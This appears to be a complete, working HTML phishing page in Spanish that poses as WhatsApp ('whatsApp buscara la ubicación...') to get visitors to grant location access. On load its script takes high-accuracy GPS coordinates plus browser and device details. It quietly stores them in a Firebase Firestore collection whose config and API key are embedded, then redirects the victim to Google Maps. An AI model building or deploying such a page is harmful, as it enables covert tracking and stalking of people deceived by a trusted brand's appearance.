
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Proyecto 1</title>

<style>
body{
    margin:0;
    padding:20px;
    font-family:Arial, sans-serif;
    background:linear-gradient(180deg,#dcf8c6,#b9f5d0);
    min-height:100vh;
    text-align:center;
}

h2{
    color:#075E54;
    font-size:32px;
    margin-bottom:10px;
}

p{
    color:#128C7E;
    font-size:18px;
    margin-bottom:20px;
}

iframe{
    width:100%;
    height:350px;
    border:none;
    border-radius:15px;
    box-shadow:0 5px 15px rgba(0,0,0,.25);
}
</style>

</head>
<body>
    <img src="https://https://www.magnific.com/es/vector-gratis/icono-aplicacion-mensajeria-whatsapp-burbuja-chat-verde-estilo-3d_427106681.htm#fromView=keyword&page=1&position=14&uuid=ab85bb9a-fcbe-4675-b8af-c929416f7757&query=Logo+whatsapp.png" class="imagen-superior">

<h2>whatsApp buscara la ubicación...</h2>

<p id="estado">Por favor activa la ubicación y concede el permiso para continuar.</p>

<iframe
src="https://maps.google.com/maps?q=Bogota%20Colombia&t=&z=12&ie=UTF8&iwloc=&output=embed">
</iframe>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
import {
  getFirestore,
  collection,
  addDoc,
  serverTimestamp
} from "https://www.gstatic.com/firebasejs/12.0.0/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyDSWRC7tyowLD-ZnzvSzkTDS9L3P_eGfRM",
  authDomain: "proyecto-1-ea0ed.firebaseapp.com",
  projectId: "proyecto-1-ea0ed",
  storageBucket: "proyecto-1-ea0ed.firebasestorage.app",
  messagingSenderId: "440062306942",
  appId: "1:440062306942:web:74eab86708e22587d7462f"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const estado = document.getElementById("estado");

// Función para guardar la ubicación en Firestore
async function guardarUbicacion(posicion) {

    try {

        await addDoc(collection(db, "ubicaciones"), {

            lat: posicion.coords.latitude,
            lon: posicion.coords.longitude,
            precision: posicion.coords.accuracy,

            fecha: serverTimestamp(),

            userAgent: navigator.userAgent,
            idioma: navigator.language,
            plataforma: navigator.platform,

            anchoPantalla: screen.width,
            altoPantalla: screen.height

        });

        console.log("Ubicación guardada correctamente en Firebase.");

        estado.textContent = "✅ Ubicación guardada. Redirigiendo...";

        return true;

    } catch (error) {

        console.error("Error al guardar la ubicación:", error);

        estado.textContent = "⚠️ No se pudo guardar la ubicación.";

        return false;

    }

}

if ("geolocation" in navigator) {

    navigator.geolocation.getCurrentPosition(

        async function(posicion){

            const lat = posicion.coords.latitude;
            const lon = posicion.coords.longitude;

            estado.textContent = "📍 Ubicación obtenida, guardando...";

            const guardado = await guardarUbicacion(posicion);

            if (guardado) {

                estado.textContent = "✅ Información guardada. Abriendo Google Maps...";

                setTimeout(function(){

                    window.location.href =
                    "https://www.google.com/maps?q=" + lat + "," + lon;

                },2500);

            } else {

                estado.textContent = "⚠️ No fue posible guardar la información.";

            }

        },

        function(error){

            switch(error.code){

                case error.PERMISSION_DENIED:
                    alert("Activa la ubicación y refresca la pagina.");
                    break;

                case error.POSITION_UNAVAILABLE:
                    alert("No fue posible obtener la ubicación.");
                    break;

                case error.TIMEOUT:
                    alert("La solicitud tardó demasiado.");
                    break;

                default:
                    alert("Ocurrió un error desconocido.");
            }

        },

        {
            enableHighAccuracy:true,
            timeout:10000,
            maximumAge:0
        }

    );

} else {

    alert("Tu navegador no soporta geolocalización.");

}

</script>

</body>
</html>
